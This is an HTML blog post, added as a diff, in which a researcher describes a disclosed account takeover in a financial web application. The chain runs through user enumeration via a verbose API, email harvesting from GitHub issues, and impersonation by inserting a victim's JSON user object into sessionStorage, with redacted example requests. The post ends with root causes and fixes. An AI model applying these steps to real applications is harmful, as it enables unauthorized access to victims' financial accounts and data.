@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+<title>
+Account Takeover Through Manipulation of Session Storage — thevillagehacker
+</title>
+
+<meta name="description"
+content="Account Takeover through manipulation of session storage values."/>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700;800&family=Inter:wght@300;400;500;600;700&display=swap"
+rel="stylesheet">
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+
+<link rel="stylesheet" href="../assets/css/style.css"/>
+
+<style>
+
+.hljs{
+    background:#070b12 !important;
+    color:#d6deeb !important;
+
+    padding:22px !important;
+
+    font-family:'JetBrains Mono', monospace !important;
+    font-size:13px !important;
+    line-height:1.65 !important;
+
+    border-radius:0 0 8px 8px;
+}
+
+.hljs-keyword{color:#c792ea !important;}
+.hljs-string{color:#ecc48d !important;}
+.hljs-title{color:#82aaff !important;}
+.hljs-comment{color:#5c6773 !important;}
+.hljs-number{color:#f78c6c !important;}
+.hljs-built_in{color:#89ddff !important;}
+.hljs-attr{color:#ffcb6b !important;}
+
+pre{
+    position:relative;
+}
+
+pre::before{
+
+    content:'';
+
+    display:block;
+
+    height:38px;
+
+    border-bottom:1px solid #1e2a38;
+
+    background:
+        radial-gradient(circle at 18px 19px,#ff5f56 0 4px,transparent 5px),
+        radial-gradient(circle at 36px 19px,#ffbd2e 0 4px,transparent 5px),
+        radial-gradient(circle at 54px 19px,#27c93f 0 4px,transparent 5px),
+        linear-gradient(to bottom,#101722,#0c121c);
+
+    border-radius:8px 8px 0 0;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="blog-nav">
+
+    <div class="blog-nav-inner">
+
+        <a href="../index.html" class="nav-logo">
+            TheVillageHacker
+        </a>
+
+        <div class="nav-links">
+
+            <a href="../blog.html">
+                Blog
+            </a>
+            <a href="https://thevillagehacker-security.gitbook.io/ctf-writeups">
+                Writeups
+            </a>
+
+        </div>
+
+    </div>
+
+</div>
+
+<div class="advisory-banner">
+    ACCOUNT TAKEOVER // SESSION STORAGE // AUTHORIZATION BYPASS
+</div>
+
+<div class="container">
+
+<header class="header">
+
+    <span class="cve-tag">
+        WEB APPLICATION SECURITY
+    </span>
+
+    <h1>
+        Account Takeover Through Manipulation of Session Storage
+    </h1>
+
+    <p class="subtitle">
+        SESSION STORAGE // USER ENUMERATION // COOKIE AUTHENTICATION
+    </p>
+
+    <div class="meta">
+
+        <div class="meta-item">
+            <div class="label">researcher</div>
+            <div class="value">Naveen Jagadeesan</div>
+        </div>
+
+        <div class="meta-item">
+            <div class="label">published</div>
+            <div class="value">2023-03-30</div>
+        </div>
+
+        <div class="meta-item">
+            <div class="label">platform</div>
+            <div class="value">Financial Web Application</div>
+        </div>
+
+    </div>
+
+</header>
+
+<article>
+
+<p>
+This article explores account takeover through manipulation
+of session storage values in a financial web application.
+</p>
+
+<h2>Target Background</h2>
+
+<p>
+The target application was designed for financial workflows
+including invoice generation, payment tracking, and
+reconciliation operations.
+</p>
+
+<p>
+Users could create organizations, invite members, and assign
+roles for collaborative financial management.
+</p>
+
+<h2>Overview</h2>
+
+<p>
+A test account was created to evaluate the application's
+authentication and authorization logic.
+</p>
+
+<p>
+After login, the application required users to create an
+organization and assign team roles.
+</p>
+
+<h2>Reconnaissance</h2>
+
+<ul>
+
+<li>ReactJS frontend</li>
+
+<li>Akamai WAF</li>
+
+<li>REST APIs</li>
+
+<li>Cookie-based authentication</li>
+
+</ul>
+
+<h2>User Enumeration</h2>
+
+<p>
+During authentication the application performed a user
+verification request based on the supplied email address.
+</p>
+
+<h2>Request</h2>
+
+<pre><code class="language-text">
+GET /api/v1/user?email=nj@tvhsecurity.com HTTP/2
+Host: www.target.com
+Cookie: session=blahblah
+</code></pre>
+
+<h2>Response</h2>
+
+<pre><code class="language-json">
+{
+  "status": true,
+  "message": "Successfully Retrieved",
+  "result": [
+    {
+      "UserId": 601XXX,
+      "EmailId": "nj@tvhsecurity.com",
+      "RoleName": "Admin",
+      "CountryName": "India",
+      "Status": "Approved",
+      "IsActive": true
+    }
+  ]
+}
+</code></pre>
+
+<p>
+The API exposed excessive user metadata during the login
+workflow.
+</p>
+
+<h2>Post Login Analysis</h2>
+
+<p>
+Further analysis of browser storage revealed that the
+application stored user information inside session storage.
+</p>
+
+<p>
+The stored values matched the response returned from the
+user verification API endpoint.
+</p>
+
+<img src="../assets/images/blogs/ATO/session_storage.png"
+alt="session storage">
+
+<h2>Theory</h2>
+
+<p>
+The application relied on encrypted cookies for authentication,
+however authorization logic appeared dependent on session
+storage values.
+</p>
+
+<p>
+To validate the theory, a second legitimate user account was
+created for testing.
+</p>
+
+<p>
+The objective was to determine whether replacing session
+storage values would impersonate another user account.
+</p>
+
+<img src="../assets/images/blogs/ATO/Signed_up_user.png"
+alt="signed up user">
+
+<h2>Extracting User Data</h2>
+
+<p>
+A second verification request was issued using another user's
+email address.
+</p>
+
+<pre><code class="language-text">
+GET /api/v1/user?email=nj+1@tvhsecurity.com HTTP/2
+Host: www.target.com
+</code></pre>
+
+<p>
+The returned JSON response contained the complete user object
+required for impersonation.
+</p>
+
+<h2>Session Storage Manipulation</h2>
+
+<p>
+The extracted JSON payload was copied into the session storage
+value associated with the <code>login</code> key.
+</p>
+
+<p>
+After refreshing the page, the application granted access to
+the second user's account.
+</p>
+
+<h2>OSINT Reconnaissance</h2>
+
+<p>
+To validate the issue against a real-world account,
+OSINT reconnaissance was performed against the target
+organization.
+</p>
+
+<p>
+Corporate email addresses were collected from:
+</p>
+
+<ul>
+
+<li>Public contact pages</li>
+
+<li>GitHub repositories</li>
+
+<li>Issue tracker comments</li>
+
+<li>Developer discussions</li>
+
+</ul>
+
+<h2>GitHub Recon</h2>
+
+<p>
+GitHub issue comments revealed valid employee email addresses
+associated with the organization.
+</p>
+
+<img src="../assets/images/blogs/ATO/github.png"
+alt="github recon">
+
+<p>
+The discovered email addresses were tested using Intruder
+to identify valid accounts through content-length variations.
+</p>
+
+<h2>Verify User</h2>
+
+<h2>Request</h2>
+
+<pre><code class="language-text">
+GET /api/v1/user?email=baXXXXXX@target.com HTTP/2
+Host: www.target.com
+</code></pre>
+
+<h2>Response</h2>
+
+<pre><code class="language-json">
+{
+  "status": true,
+  "message": "Successfully Retrieved",
+  "result": [
+    {
+      "UserId": 10XXX,
+      "EmailId": "baXXXXXX@target.com",
+      "RoleName": "Admin",
+      "CountryName": "United States",
+      "Status": "Approved"
+    }
+  ]
+}
+</code></pre>
+
+<h2>Checkpoint</h2>
+
+<ul>
+
+<li>Valid user email identified</li>
+
+<li>User metadata extracted</li>
+
+<li>Session storage structure understood</li>
+
+<li>Authorization trust assumptions confirmed</li>
+
+</ul>
+
+<h2>Extracted Session Value</h2>
+
+<pre><code class="language-json">
+{
+  "UserId": 10XXX,
+  "EmailId": "baXXXXXX@target.com",
+  "RoleName": "Admin",
+  "CountryName": "United States",
+  "Status": "Approved"
+}
+</code></pre>
+
+<p>
+The above JSON object was inserted into session storage in
+order to impersonate the target user.
+</p>
+
+<h2>Exploitation</h2>
+
+<p>
+After replacing the session storage value and refreshing the
+application, full access to the victim account was obtained.
+</p>
+
+<img src="../assets/images/blogs/ATO/Exploitation.png"
+alt="account takeover">
+
+<p>
+The application exposed:
+</p>
+
+<ul>
+
+<li>Invoices</li>
+
+<li>Financial records</li>
+
+<li>User information</li>
+
+<li>Administrative functionality</li>
+
+</ul>
+
+<h2>Impact</h2>
+
+<ul>
+
+<li>Account Takeover</li>
+
+<li>Privilege escalation</li>
+
+<li>Unauthorized financial access</li>
+
+<li>User impersonation</li>
+
+<li>Exposure of sensitive business data</li>
+
+<li>Potential invoice manipulation</li>
+
+</ul>
+
+<h2>Root Cause</h2>
+
+<ul>
+
+<li>Trusting client-side session storage</li>
+
+<li>Broken authorization model</li>
+
+<li>Excessive API data exposure</li>
+
+<li>User enumeration vulnerability</li>
+
+<li>Improper session validation</li>
+
+</ul>
+
+<h2>Conclusion</h2>
+
+<p>
+Authorization decisions should never rely on mutable
+client-side storage mechanisms such as sessionStorage
+or localStorage.
+</p>
+
+<p>
+Applications must validate user identity and permissions
+server-side using trusted session state and immutable
+authorization checks.
+</p>
+
+<p>
+Combined with user enumeration and excessive metadata
+exposure, the flawed authorization design enabled full
+account takeover against legitimate users.
+</p>
+
+<p>
+Thank you for reading.
+</p>
+
+</article>
+
+<footer>
+
+    <span class="footer-text">
+        © 2026
+        <a href="../index.html">thevillagehacker</a>
+        — Naveen Jagadeesan
+    </span>
+
+    <span class="footer-text">
+        status: active<span class="blink"></span>
+    </span>
+
+</footer>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+<script>
+hljs.highlightAll();
+</script>
+
+</body>
+</html>
